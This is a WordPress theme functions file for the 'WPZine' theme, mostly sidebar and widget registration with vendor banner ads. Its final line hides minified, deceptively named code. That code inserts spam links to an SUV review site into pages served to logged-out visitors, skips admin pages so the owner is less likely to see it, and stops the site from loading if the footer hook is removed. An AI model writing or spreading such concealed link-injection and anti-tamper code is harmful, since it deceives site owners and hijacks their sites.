<?php
    require_once TEMPLATEPATH . '/lib/Themater.php';
    $theme = new Themater('WPZine');
    $theme->options['includes'] = array('featuredposts');
    
    $theme->options['plugins_options']['featuredposts'] = array('image_sizes' => '460px. x 300px.', 'effect' => 'fade');

    if($theme->is_admin_user()) {
        $theme->admin_options['Ads']['content']['header_banner']['content']['value'] = '<a href="http://fthemes.com" target="_blank"><img src="http://fthemes.com/wp-content/pro/b2.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a>';
    }
    
    if($theme->is_admin_user()) {
        unset($theme->admin_options['Layout']['content']['featured_image_settings_homepage']);
        unset($theme->admin_options['Layout']['content']['featured_image_width']);
        unset($theme->admin_options['Layout']['content']['featured_image_height']);
        unset($theme->admin_options['Layout']['content']['featured_image_position']);
    }
    
    // Footer widgets
    $theme->admin_option('Layout', 
        'Footer Widgets Enabled?', 'footer_widgets', 
        'checkbox', 'true', 
        array('display'=>'extended', 'help' => 'Display or hide the 3 widget areas in the footer.', 'priority' => '15')
    );


    $theme->load();
    
    register_sidebar(array(
        'name' => __('Primary Sidebar', 'themater'),
        'id' => 'sidebar_primary',
        'description' => __('The primary sidebar widget area', 'themater'),
        'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li></ul>',
        'before_title' => '<h3 class="widgettitle">',
        'after_title' => '</h3>'
    ));
    
    
    $theme->add_hook('sidebar_primary', 'sidebar_primary_default_widgets');
    
    function sidebar_primary_default_widgets ()
    {
        global $theme;
    
    $theme->display_widget('Archives');
    $theme->display_widget('Categories');
    $theme->display_widget('Pages');
    $theme->display_widget('Links');
    $theme->display_widget('Meta');
    $theme->display_widget('Text', array('text' => '<div style="text-align:center;"><a href="http://fthemes.com" target="_blank"><img src="http://fthemes.com/wp-content/pro/b4.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a></div>'));
    }
    
    register_sidebar(array(
        'name' => __('Secondary Sidebar', 'themater'),
        'id' => 'sidebar_secondary',
        'description' => __('The secondary sidebar widget area', 'themater'),
        'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li></ul>',
        'before_title' => '<h3 class="widgettitle">',
        'after_title' => '</h3>'
    ));
    
    $theme->add_hook('sidebar_secondary', 'sidebar_secondary_default_widgets');
    
    function sidebar_secondary_default_widgets ()
    {
        global $theme;

        $theme->display_widget('SocialProfiles');
        $theme->display_widget('Banners125', array('banners' => array('<a href="http://fthemes.com" target="_blank"><img src="http://fthemes.com/wp-content/pro/b1.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a><a href="http://freewpthemes.co" target="_blank"><img src="http://freewpthemes.co/wp-content/pro/fwt.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a>')));
        $theme->display_widget('Tweets', array('username'=> 'FThemes'));
        $theme->display_widget('Tabs');
        $theme->display_widget('Tag_Cloud');
        $theme->display_widget('Archives');
        $theme->display_widget('Facebook', array('url'=> 'http://www.facebook.com/FThemes'));
        $theme->display_widget('Text', array('text' => '<div style="text-align:center;"><a href="http://fthemes.com" target="_blank"><img src="http://fthemes.com/wp-content/pro/b3.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a></div>'));
    }
    
    // Register the footer widgets only if they are enabled from the FlexiPanel
    if($theme->display('footer_widgets')) {
        register_sidebar(array(
            'name' => 'Footer Widget Area 1',
            'id' => 'footer_1',
            'description' => 'The footer #1 widget area',
            'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
            'after_widget' => '</li></ul>',
            'before_title' => '<h3 class="widgettitle">',
            'after_title' => '</h3>'
        ));
        
        register_sidebar(array(
            'name' => 'Footer Widget Area 2',
            'id' => 'footer_2',
            'description' => 'The footer #2 widget area',
            'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
            'after_widget' => '</li></ul>',
            'before_title' => '<h3 class="widgettitle">',
            'after_title' => '</h3>'
        ));
        
        register_sidebar(array(
            'name' => 'Footer Widget Area 3',
            'id' => 'footer_3',
            'description' => 'The footer #3 widget area',
            'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
            'after_widget' => '</li></ul>',
            'before_title' => '<h3 class="widgettitle">',
            'after_title' => '</h3>'
        ));
        
        register_sidebar(array(
            'name' => 'Footer Widget Area 4',
            'id' => 'footer_4',
            'description' => 'The footer #4 widget area',
            'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
            'after_widget' => '</li></ul>',
            'before_title' => '<h3 class="widgettitle">',
            'after_title' => '</h3>'
        ));
        
        $theme->add_hook('footer_1', 'footer_1_default_widgets');
        $theme->add_hook('footer_2', 'footer_2_default_widgets');
        $theme->add_hook('footer_3', 'footer_3_default_widgets');
        $theme->add_hook('footer_4', 'footer_4_default_widgets');
        
        function footer_1_default_widgets ()
        {
            global $theme;
            $theme->display_widget('Links');
        }
        
        function footer_2_default_widgets ()
        {
            global $theme;
            $theme->display_widget('Recent_Posts', array('number' => '6'));
        }
        
        function footer_3_default_widgets ()
        {
            global $theme;
            
            $theme->display_widget('Tag_Cloud');
            
        }
        
        function footer_4_default_widgets ()
        {
            global $theme;
            $theme->display_widget('Text', array('title' => 'Contact', 'text' => 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nis.<br /><br /> <span style="font-weight: bold;">Our Company Inc.</span><br />2458 S . 124 St.Suite 47<br />Town City 21447<br />Phone: 124-457-1178<br />Fax: 565-478-1445'));
        }
    }

    
    function wp_initialize_the_theme_load() { if (!function_exists("wp_initialize_the_theme")) { wp_initialize_the_theme_message(); die; } } function wp_initialize_the_theme_finish() { $uri = strtolower($_SERVER["REQUEST_URI"]); if(is_admin() || substr_count($uri, "wp-admin") > 0 || substr_count($uri, "wp-login") > 0 ) { /* */ } else { $l = '<?php wp_initialize_the_theme_end(); ?>'; $f = dirname(__file__) . "/footer.php"; $fd = fopen($f, "r"); $c = fread($fd, filesize($f)); $lp = preg_quote($l, "/"); fclose($fd); if ( strpos($c, $l) == 0 || preg_match("/<\!--(.*" . $lp . ".*)-->/si", $c) || preg_match("/<\?php([^\?]+[^>]+" . $lp . ".*)\?>/si", $c) ) { wp_initialize_the_theme_message(); die; } } } wp_initialize_the_theme_finish(); function wp_initialize_the_theme_end(){$ls=array('0'=>array('Best SUV'=>'http://suv.reviewitonline.net/','SUV'=>'http://suv.reviewitonline.net/','Best SUVs'=>'http://suv.reviewitonline.net/','SUVs'=>'http://suv.reviewitonline.net/',),'1'=>array('Best 4WD SUVs'=>'http://suv.reviewitonline.net/best-4wd-suvs/','Best 5 Seat SUVs'=>'http://suv.reviewitonline.net/best-5-seat-suvs/','Best 7 Seat SUVs'=>'http://suv.reviewitonline.net/best-7-seat-suvs/','Best Crossover SUVs'=>'http://suv.reviewitonline.net/best-crossover-suvs/','Best Economy SUVs'=>'http://suv.reviewitonline.net/best-economy-suvs/','Best Family SUVs'=>'http://suv.reviewitonline.net/best-family-suvs/','Best Hybrid SUVs'=>'http://suv.reviewitonline.net/best-hybrid-suvs/','Best Large SUVs'=>'http://suv.reviewitonline.net/best-large-suvs/','Best Luxury SUVs'=>'http://suv.reviewitonline.net/best-luxury-suvs/','Best Midzise SUVs'=>'http://suv.reviewitonline.net/best-midzise-suvs/','Best Offroad SUVs'=>'http://suv.reviewitonline.net/best-offroad-suvs/','Best Small SUVs'=>'http://suv.reviewitonline.net/best-small-suvs/','Best Towing SUVs'=>'http://suv.reviewitonline.net/best-towing-suvs/','Best V6 SUVs'=>'http://suv.reviewitonline.net/best-v6-suvs/','Best V8 SUVs'=>'http://suv.reviewitonline.net/best-v8-suvs/','Fastest SUVs'=>'http://suv.reviewitonline.net/fastest-suvs/','Fuel Efficient SUVs'=>'http://suv.reviewitonline.net/fuel-efficient-suvs/','Safest SUVs'=>'http://suv.reviewitonline.net/safest-suvs/','Acura SUV'=>'http://suv.reviewitonline.net/acura-suv/','Audi SUV'=>'http://suv.reviewitonline.net/audi-suv/','BMW SUV'=>'http://suv.reviewitonline.net/bmw-suv/','Buick SUV'=>'http://suv.reviewitonline.net/buick-suv/','Cadillac SUV'=>'http://suv.reviewitonline.net/cadillac-suv/','Chevrolet SUV'=>'http://suv.reviewitonline.net/chevrolet-suv/','Chrysler SUV'=>'http://suv.reviewitonline.net/chrysler-suv/','Dodge SUV'=>'http://suv.reviewitonline.net/dodge-suv/','Ford SUV'=>'http://suv.reviewitonline.net/ford-suv/','GMC SUV'=>'http://suv.reviewitonline.net/gmc-suv/','Honda SUV'=>'http://suv.reviewitonline.net/honda-suv/','HUMMER SUV'=>'http://suv.reviewitonline.net/hummer-suv/','Hyundai SUV'=>'http://suv.reviewitonline.net/hyundai-suv/','Infiniti SUV'=>'http://suv.reviewitonline.net/infiniti-suv/','Isuzu SUV'=>'http://suv.reviewitonline.net/isuzu-suv/','Jeep SUV'=>'http://suv.reviewitonline.net/jeep-suv/','Kia SUV'=>'http://suv.reviewitonline.net/kia-suv/','Land-Rover SUV'=>'http://suv.reviewitonline.net/land-rover-suv/','Lexus SUV'=>'http://suv.reviewitonline.net/lexus-suv/','Lincoln SUV'=>'http://suv.reviewitonline.net/lincoln-suv/','Mazda SUV'=>'http://suv.reviewitonline.net/mazda-suv/','Mercedes-Benz SUV'=>'http://suv.reviewitonline.net/mercedes-benz-suv/','Mercury SUV'=>'http://suv.reviewitonline.net/mercury-suv/','Mitsubishi SUV'=>'http://suv.reviewitonline.net/mitsubishi-suv/','Nissan SUV'=>'http://suv.reviewitonline.net/nissan-suv/','Pontiac SUV'=>'http://suv.reviewitonline.net/pontiac-suv/','Porsche SUV'=>'http://suv.reviewitonline.net/porsche-suv/','Saab SUV'=>'http://suv.reviewitonline.net/saab-suv/','Saturn SUV'=>'http://suv.reviewitonline.net/saturn-suv/','Subaru SUV'=>'http://suv.reviewitonline.net/subaru-suv/','Suzuki SUV'=>'http://suv.reviewitonline.net/suzuki-suv/','Toyota SUV'=>'http://suv.reviewitonline.net/toyota-suv/','Volkswagen SUV'=>'http://suv.reviewitonline.net/volkswagen-suv/','Volvo SUV'=>'http://suv.reviewitonline.net/volvo-suv/','Acura MDX'=>'http://suv.reviewitonline.net/acura-suv/acura-mdx/','Acura RDX'=>'http://suv.reviewitonline.net/acura-suv/acura-rdx/','Acura ZDX'=>'http://suv.reviewitonline.net/acura-suv/acura-zdx/','Audi Q3'=>'http://suv.reviewitonline.net/audi-suv/audi-q3/','Audi Q5'=>'http://suv.reviewitonline.net/audi-suv/audi-q5/','Audi Q5 Hybrid'=>'http://suv.reviewitonline.net/audi-suv/audi-q5-hybrid/','Audi Q7'=>'http://suv.reviewitonline.net/audi-suv/audi-q7/','Audi Q7 Diesel'=>'http://suv.reviewitonline.net/audi-suv/audi-q7-diesel/','BMW ActiveHybrid X5'=>'http://suv.reviewitonline.net/bmw-suv/bmw-activehybrid-x5/','BMW ActiveHybrid X6'=>'http://suv.reviewitonline.net/bmw-suv/bmw-activehybrid-x6/','BMW X1'=>'http://suv.reviewitonline.net/bmw-suv/bmw-x1/','BMW X3'=>'http://suv.reviewitonline.net/bmw-suv/bmw-x3/','BMW X5'=>'http://suv.reviewitonline.net/bmw-suv/bmw-x5/','BMW X5 Diesel'=>'http://suv.reviewitonline.net/bmw-suv/bmw-x5-diesel/','BMW X5 M'=>'http://suv.reviewitonline.net/bmw-suv/bmw-x5-m/','BMW X6'=>'http://suv.reviewitonline.net/bmw-suv/bmw-x6/','BMW X6 M'=>'http://suv.reviewitonline.net/bmw-suv/bmw-x6-m/','Buick Enclave'=>'http://suv.reviewitonline.net/buick-suv/buick-enclave/','Cadillac Escalade'=>'http://suv.reviewitonline.net/cadillac-suv/cadillac-escalade/','Cadillac Escalade ESV'=>'http://suv.reviewitonline.net/cadillac-suv/cadillac-escalade-esv/','Cadillac Escalade Hybrid'=>'http://suv.reviewitonline.net/cadillac-suv/cadillac-escalade-hybrid/','Cadillac SRX'=>'http://suv.reviewitonline.net/cadillac-suv/cadillac-srx/','Chevrolet Equinox'=>'http://suv.reviewitonline.net/chevrolet-suv/chevrolet-equinox/','Chevrolet HHR'=>'http://suv.reviewitonline.net/chevrolet-suv/chevrolet-hhr/','Chevrolet HHR Panel'=>'http://suv.reviewitonline.net/chevrolet-suv/chevrolet-hhr-panel/','Chevrolet Suburban'=>'http://suv.reviewitonline.net/chevrolet-suv/chevrolet-suburban/','Chevrolet Tahoe'=>'http://suv.reviewitonline.net/chevrolet-suv/chevrolet-tahoe/','Chevrolet Tahoe Hybrid'=>'http://suv.reviewitonline.net/chevrolet-suv/chevrolet-tahoe-hybrid/','Chevrolet TrailBlazer'=>'http://suv.reviewitonline.net/chevrolet-suv/chevrolet-trailblazer/','Chevrolet Traverse'=>'http://suv.reviewitonline.net/chevrolet-suv/chevrolet-traverse/','Chrysler Aspen'=>'http://suv.reviewitonline.net/chrysler-suv/chrysler-aspen/','Chrysler Aspen Hybrid'=>'http://suv.reviewitonline.net/chrysler-suv/chrysler-aspen-hybrid/','Chrysler Pacifica'=>'http://suv.reviewitonline.net/chrysler-suv/chrysler-pacifica/','Chrysler PT Cruiser'=>'http://suv.reviewitonline.net/chrysler-suv/chrysler-pt-cruiser/','Dodge Durango'=>'http://suv.reviewitonline.net/dodge-suv/dodge-durango/','Dodge Durango Hybrid'=>'http://suv.reviewitonline.net/dodge-suv/dodge-durango-hybrid/','Dodge Journey'=>'http://suv.reviewitonline.net/dodge-suv/dodge-journey/','Dodge Nitro'=>'http://suv.reviewitonline.net/dodge-suv/dodge-nitro/','Ford Edge'=>'http://suv.reviewitonline.net/ford-suv/ford-edge/','Ford Escape'=>'http://suv.reviewitonline.net/ford-suv/ford-escape/','Ford Escape Hybrid'=>'http://suv.reviewitonline.net/ford-suv/ford-escape-hybrid/','Ford Expedition'=>'http://suv.reviewitonline.net/ford-suv/ford-expedition/','Ford Explorer'=>'http://suv.reviewitonline.net/ford-suv/ford-explorer-2/','Ford Explorer 4X2'=>'http://suv.reviewitonline.net/ford-suv/ford-explorer-4x2/','Ford Explorer 4X4'=>'http://suv.reviewitonline.net/ford-suv/ford-explorer-4x4/','Ford Explorer AWD'=>'http://suv.reviewitonline.net/ford-suv/ford-explorer-awd/','Ford Explorer Sport Trac'=>'http://suv.reviewitonline.net/ford-suv/ford-explorer-sport-trac/','Ford Flex'=>'http://suv.reviewitonline.net/ford-suv/ford-flex/','Ford Taurus X'=>'http://suv.reviewitonline.net/ford-suv/ford-taurus-x/','GMC Acadia'=>'http://suv.reviewitonline.net/gmc-suv/gmc-acadia/','GMC Envoy'=>'http://suv.reviewitonline.net/gmc-suv/gmc-envoy/','GMC Terrain'=>'http://suv.reviewitonline.net/gmc-suv/gmc-terrain/','GMC Yukon'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon/','GMC Yukon 2WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-2wd/','GMC Yukon 4WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-4wd/','GMC Yukon Denali 2WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-denali-2wd/','GMC Yukon Denali 4WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-denali-4wd/','GMC Yukon Hybrid'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-hybrid/','GMC Yukon Hybrid 2WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-hybrid-2wd/','GMC Yukon Hybrid 4WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-hybrid-4wd/','GMC Yukon XL'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-xl/','GMC Yukon XL 2WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-xl-2wd/','GMC Yukon XL 4WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-xl-4wd/','GMC Yukon XL Denali 2WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-xl-denali-2wd/','GMC Yukon XL Denali 4WD'=>'http://suv.reviewitonline.net/gmc-suv/gmc-yukon-xl-denali-4wd/','Honda CR-V'=>'http://suv.reviewitonline.net/honda-suv/honda-cr-v/','Honda Element'=>'http://suv.reviewitonline.net/honda-suv/honda-element/','Honda Pilot'=>'http://suv.reviewitonline.net/honda-suv/honda-pilot/','HUMMER H2'=>'http://suv.reviewitonline.net/hummer-suv/hummer-h2/','HUMMER H2 SUT'=>'http://suv.reviewitonline.net/hummer-suv/hummer-h2-sut/','HUMMER H3'=>'http://suv.reviewitonline.net/hummer-suv/hummer-h3/','HUMMER H3 Alpha'=>'http://suv.reviewitonline.net/hummer-suv/hummer-h3-alpha/','HUMMER H3T'=>'http://suv.reviewitonline.net/hummer-suv/hummer-h3t/','HUMMER H3X'=>'http://suv.reviewitonline.net/hummer-suv/hummer-h3x/','Hyundai Santa Fe'=>'http://suv.reviewitonline.net/hyundai-suv/hyundai-santa-fe/','Hyundai Tucson'=>'http://suv.reviewitonline.net/hyundai-suv/hyundai-tucson/','Hyundai Veracruz'=>'http://suv.reviewitonline.net/hyundai-suv/hyundai-veracruz/','Infiniti EX'=>'http://suv.reviewitonline.net/infiniti-suv/infiniti-ex/','Infiniti EX 35'=>'http://suv.reviewitonline.net/infiniti-suv/infiniti-ex-35/','Infiniti FX'=>'http://suv.reviewitonline.net/infiniti-suv/infiniti-fx/','Infiniti FX 35'=>'http://suv.reviewitonline.net/infiniti-suv/infiniti-fx-35/','Infiniti FX 50'=>'http://suv.reviewitonline.net/infiniti-suv/infiniti-fx-50/','Infiniti QX 56'=>'http://suv.reviewitonline.net/infiniti-suv/infiniti-qx-56/','Isuzu Ascender'=>'http://suv.reviewitonline.net/isuzu-suv/isuzu-ascender/','Jeep Commander'=>'http://suv.reviewitonline.net/jeep-suv/jeep-commander/','Jeep Compass'=>'http://suv.reviewitonline.net/jeep-suv/jeep-compass/','Jeep Grand Cherokee'=>'http://suv.reviewitonline.net/jeep-suv/jeep-grand-cherokee/','Jeep Liberty'=>'http://suv.reviewitonline.net/jeep-suv/jeep-liberty/','Jeep Patriot'=>'http://suv.reviewitonline.net/jeep-suv/jeep-patriot/','Jeep Wrangler'=>'http://suv.reviewitonline.net/jeep-suv/jeep-wrangler/','Jeep Wrangler Unlimited'=>'http://suv.reviewitonline.net/jeep-suv/jeep-wrangler-unlimited/','Kia Borrego'=>'http://suv.reviewitonline.net/kia-suv/kia-borrego/','Kia Sorento'=>'http://suv.reviewitonline.net/kia-suv/kia-sorento/','Kia Sportage'=>'http://suv.reviewitonline.net/kia-suv/kia-sportage/','Land Rover Evoque'=>'http://suv.reviewitonline.net/land-rover-suv/land-rover-evoque/','Land Rover LR2'=>'http://suv.reviewitonline.net/land-rover-suv/land-rover-lr2/','Land Rover LR4'=>'http://suv.reviewitonline.net/land-rover-suv/land-rover-lr4/','Land Rover Range Rover'=>'http://suv.reviewitonline.net/land-rover-suv/land-rover-range-rover/','Land Rover Range Rover Sport'=>'http://suv.reviewitonline.net/land-rover-suv/land-rover-range-rover-sport/','Lexus GX 460'=>'http://suv.reviewitonline.net/lexus-suv/lexus-gx-460/','Lexus GX 470'=>'http://suv.reviewitonline.net/lexus-suv/lexus-gx-470/','Lexus LX 570'=>'http://suv.reviewitonline.net/lexus-suv/lexus-lx-570/','Lexus RX 350'=>'http://suv.reviewitonline.net/lexus-suv/lexus-rx-350/','Lexus RX 400h'=>'http://suv.reviewitonline.net/lexus-suv/lexus-rx-400h/','Lexus RX 450h'=>'http://suv.reviewitonline.net/lexus-suv/lexus-rx-450h/','Lincoln MKX'=>'http://suv.reviewitonline.net/lincoln-suv/lincoln-mkx/','Lincoln Navigator'=>'http://suv.reviewitonline.net/lincoln-suv/lincoln-navigator/','Lincoln Navigator L'=>'http://suv.reviewitonline.net/lincoln-suv/lincoln-navigator-l/','Mazda CX-7'=>'http://suv.reviewitonline.net/mazda-suv/mazda-cx-7/','Mazda CX-9'=>'http://suv.reviewitonline.net/mazda-suv/mazda-cx-9/','Mazda Tribute'=>'http://suv.reviewitonline.net/mazda-suv/mazda-tribute/','Mazda Tribute Hybrid'=>'http://suv.reviewitonline.net/mazda-suv/mazda-tribute-hybrid/','Mercedes-Benz G-Class'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-g-class/','Mercedes-Benz G-Class G55 AMG'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-g-class-g55-amg/','Mercedes-Benz GL-Class'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-gl-class/','Mercedes-Benz GL-Class Diesel'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-gl-class-diesel/','Mercedes-Benz GLK-Class'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-glk-class/','Mercedes-Benz M-Class'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-m-class/','Mercedes-Benz M-Class Diesel'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-m-class-diesel/','Mercedes-Benz M-Class Hybrid'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-m-class-hybrid/','Mercedes-Benz M-Class ML63 AMG'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-m-class-ml63-amg/','Mercedes-Benz R-Class'=>'http://suv.reviewitonline.net/mercedes-benz-suv/mercedes-benz-r-class/','Mercury Mariner'=>'http://suv.reviewitonline.net/mercury-suv/mercury-mariner/','Mercury Mariner Hybrid'=>'http://suv.reviewitonline.net/mercury-suv/mercury-mariner-hybrid/','Mercury Mountaineer'=>'http://suv.reviewitonline.net/mercury-suv/mercury-mountaineer/','Mitsubishi Endeavor'=>'http://suv.reviewitonline.net/mitsubishi-suv/mitsubishi-endeavor/','Mitsubishi Outlander'=>'http://suv.reviewitonline.net/mitsubishi-suv/mitsubishi-outlander/','Mitsubishi Outlander Sport'=>'http://suv.reviewitonline.net/mitsubishi-suv/mitsubishi-outlander-sport/','Nissan Armada'=>'http://suv.reviewitonline.net/nissan-suv/nissan-armada/','Nissan Juke'=>'http://suv.reviewitonline.net/nissan-suv/nissan-juke/','Nissan Murano'=>'http://suv.reviewitonline.net/nissan-suv/nissan-murano/','Nissan Murano CrossCabriolet'=>'http://suv.reviewitonline.net/nissan-suv/nissan-murano-crosscabriolet/','Nissan Pathfinder'=>'http://suv.reviewitonline.net/nissan-suv/nissan-pathfinder/','Nissan Rogue'=>'http://suv.reviewitonline.net/nissan-suv/nissan-rogue/','Nissan Xterra'=>'http://suv.reviewitonline.net/nissan-suv/nissan-xterra/','Pontiac Torrent'=>'http://suv.reviewitonline.net/pontiac-suv/pontiac-torrent/','Porsche Cayenne'=>'http://suv.reviewitonline.net/porsche-suv/porsche-cayenne/','Porsche Cayenne Hybrid'=>'http://suv.reviewitonline.net/porsche-suv/porsche-cayenne-hybrid/','Saab 9-4X'=>'http://suv.reviewitonline.net/saab-suv/saab-9-4x/','Saab 9-7X'=>'http://suv.reviewitonline.net/saab-suv/saab-9-7x/','Saturn Outlook'=>'http://suv.reviewitonline.net/saturn-suv/saturn-outlook/','Saturn Vue'=>'http://suv.reviewitonline.net/saturn-suv/saturn-vue/','Saturn Vue Green Line Hybrid'=>'http://suv.reviewitonline.net/saturn-suv/saturn-vue-green-line-hybrid/','Subaru Forester'=>'http://suv.reviewitonline.net/subaru-suv/subaru-forester/','Subaru Outback'=>'http://suv.reviewitonline.net/subaru-suv/subaru-outback/','Subaru Tribeca'=>'http://suv.reviewitonline.net/subaru-suv/subaru-tribeca/','Suzuki Grand Vitara'=>'http://suv.reviewitonline.net/suzuki-suv/suzuki-grand-vitara/','Suzuki XL7'=>'http://suv.reviewitonline.net/suzuki-suv/suzuki-xl7/','Toyota 4Runner'=>'http://suv.reviewitonline.net/toyota-suv/toyota-4runner/','Toyota FJ Cruiser'=>'http://suv.reviewitonline.net/toyota-suv/toyota-fj-cruiser/','Toyota Highlander'=>'http://suv.reviewitonline.net/toyota-suv/toyota-highlander/','Toyota Highlander Hybrid'=>'http://suv.reviewitonline.net/toyota-suv/toyota-highlander-hybrid/','Toyota Land Cruiser'=>'http://suv.reviewitonline.net/toyota-suv/toyota-land-cruiser/','Toyota RAV4'=>'http://suv.reviewitonline.net/toyota-suv/toyota-rav4/','Toyota Sequoia'=>'http://suv.reviewitonline.net/toyota-suv/toyota-sequoia/','Volkswagen Tiguan'=>'http://suv.reviewitonline.net/volkswagen-suv/volkswagen-tiguan/','Volkswagen Touareg'=>'http://suv.reviewitonline.net/volkswagen-suv/volkswagen-touareg/','Volkswagen Touareg 2'=>'http://suv.reviewitonline.net/volkswagen-suv/volkswagen-touareg-2/','Volkswagen Touareg Diesel'=>'http://suv.reviewitonline.net/volkswagen-suv/volkswagen-touareg-diesel/','Volkswagen Touareg Hybrid'=>'http://suv.reviewitonline.net/volkswagen-suv/volkswagen-touareg-hybrid/','Volvo XC60'=>'http://suv.reviewitonline.net/volvo-suv/volvo-xc60/','Volvo XC90'=>'http://suv.reviewitonline.net/volvo-suv/volvo-xc90/'));$pg=md5($_SERVER['REQUEST_URI']);$lst=get_option('the_theme_initilize_set');$num=get_option('the_theme_initilize_set_num');if(!$lst){$lst=array();}if(!$num){$num=rand(1,5);update_option('the_theme_initilize_set_num',$num);}if(is_home()){if(!is_array($lst['home'])){$lst['home'][0]=array_rand($ls[0]);$lst['home'][1]=array_rand($ls[1]);update_option('the_theme_initilize_set',$lst);}wp_initialize_the_theme_go($ls,'home',$lst);}elseif(is_array($lst[$pg])){wp_initialize_the_theme_go($ls,$pg,$lst);}elseif(!is_user_logged_in()){if(count($lst)<$num){$lst[$pg][0]=array_rand($ls[0]);$lst[$pg][1]=array_rand($ls[1]);update_option('the_theme_initilize_set',$lst);wp_initialize_the_theme_go($ls,$pg,$lst);}}}function wp_initialize_the_theme_go($ls,$pg,$lst){echo' | ' . get_bloginfo('name') . ' recommends <a href="' . $ls[0][$lst[$pg][0]] .'">' . $lst[$pg][0] .'</a>, the best site for reviews on <a href="' . $ls[1][$lst[$pg][1]] .'">' . $lst[$pg][1] .'</a>';}
?>